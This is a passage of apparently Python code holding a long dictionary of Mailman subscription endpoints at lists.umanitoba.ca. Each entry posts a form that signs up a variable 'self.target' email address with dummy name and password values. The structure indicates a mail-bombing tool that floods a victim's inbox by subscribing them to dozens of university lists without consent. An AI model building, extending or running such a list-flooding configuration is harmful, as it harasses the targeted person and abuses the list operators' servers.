                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-alumni2014',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GtBmb': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-alumni2015',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-alumni2015',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VuhVS': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-alumni2016',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-alumni2016',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RQIJI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-alumni2017',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-alumni2017',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iSEak': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-alumni2018',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-alumni2018',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vDgjY': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-alumni2019',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-alumni2019',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kcZJX': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-ob-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-ob-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SDGvd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-ob-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-ob-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dVVGD': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-ob-gradstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-ob-gradstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ekUOg': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-ortho-gradstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-ortho-gradstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mInKR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-orthodonticalumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-orthodonticalumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qTdrq': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-pds-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-pds-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZAJyJ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-pds-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-pds-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JROwS': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-pds-ft-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-pds-ft-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lLydN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-pds-pt-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-pds-pt-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },

            'LEHgw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-pds-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-pds-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FuLCd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-pediatricdentistryalumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-pediatricdentistryalumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KHHot': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-pedo-gradstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-pedo-gradstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LyYuP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-rd-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-rd-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JPHoF': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-rd-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-rd-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mWmbs': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dentistry-academics-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dentistry-academics-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qDysM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dermpath-l',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dermpath-l',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GiLAc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dried-fish-matters',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dried-fish-matters',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pVqci': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ece-inquiries',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ece-inquiries',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'twTeF': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/econ-faculty',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/econ-faculty',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qcAEZ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/econ-grad',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/econ-grad',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VRXbX': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/econ-grad-students-assoc-email',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/econ-grad-students-assoc-email',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TJswt': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/econgradstudentalumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/econgradstudentalumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HYHcR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'coEKK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-academics-ctl',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-academics-ctl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lYYWR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-academics-eafp',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-academics-eafp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oKRlc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BtJip': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-alumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-alumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DjqNM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-bed-2019-20',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-bed-2019-20',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yJKnX': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-bed-in-2018-19',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-bed-in-2018-19',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gjCep': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-bed-practicum-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-bed-practicum-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qGIPG': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-fac-advisors',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-fac-advisors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bwhxf': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-fac-council',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-fac-council',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XAKUa': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-fac-council-external',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-fac-council-external',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fWOCg': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-holistic-news',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-holistic-news',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uqKIf': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-med',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-med',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CUNjm': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-med-phd',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-med-phd',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kpXvL': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-phd',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-phd',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DrCXr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-retirees',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-retirees',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GKdpC': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-sessional-instructors',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-sessional-instructors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TMttT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-sessional-instructors-ctl',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-sessional-instructors-ctl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GEKOV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-sessional-instructors-eafp',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-sessional-instructors-eafp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ufqdm': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/edu-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/edu-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TrDrI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/engg-news-other',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/engg-news-other',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NsRVZ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/env-des-arch4-option',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/env-des-arch4-option',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MiuTZ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/env-des-ie4-option',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/env-des-ie4-option',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EwQVn': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/env-des-landurb4-option',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/env-des-landurb4-option',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xnJOc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/env-des-newarch3-option',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/env-des-newarch3-option',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rSJLv': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/env-des-newintenv3-option',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/env-des-newintenv3-option',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zRcog': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/env-des-newlandurb3-option',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/env-des-newlandurb3-option',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sUebq': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/env-des-yr2',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/env-des-yr2',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FOySw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/env-undergrads',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/env-undergrads',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jWDod': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/envgeo-academic-staff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/envgeo-academic-staff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vwXUb': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/envgeog-adjunct',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/envgeog-adjunct',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jRZNr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/envgeog-admin',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/envgeog-admin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ucCHd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/envgeog-grdstud',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/envgeog-grdstud',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'omGpt': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/envgeog-instr',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/envgeog-instr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZvvCl': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/envgeog-prof',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/envgeog-prof',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lqqcc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/envgeog-ugrad',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/envgeog-ugrad',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QHCBr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/event-room-request-agriculture-buildings',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/event-room-request-agriculture-buildings',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HKJVF': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/event-room-request-robson-hall',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/event-room-request-robson-hall',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hqwfo': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ext-rel-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ext-rel-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dHWSa': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ext-rel-summer2020',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ext-rel-summer2020',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jzPFy': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fa-awards',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fa-awards',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YReSE': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fafs-undergrad-hns-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fafs-undergrad-hns-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lQXGz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fhs-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fhs-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kqEot': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fhs-all-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fhs-all-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jNkAz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fhs-all-academics-ext',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fhs-all-academics-ext',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PpcXC': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fhs-all-others',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fhs-all-others',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ctNdZ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/finance-working-group',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/finance-working-group',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CFwLK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/first-6-weeks',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/first-6-weeks',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zFqme': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/first-6-weeks-returning',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/first-6-weeks-returning',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fzjnl': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/first-year-nswp-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/first-year-nswp-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OymPQ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/first-year-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/first-year-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uwlBn': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fkrm-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fkrm-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EalZh': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fkrm-faculty',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/fkrm-faculty',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QqcmR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/fkrm-graduate-students',
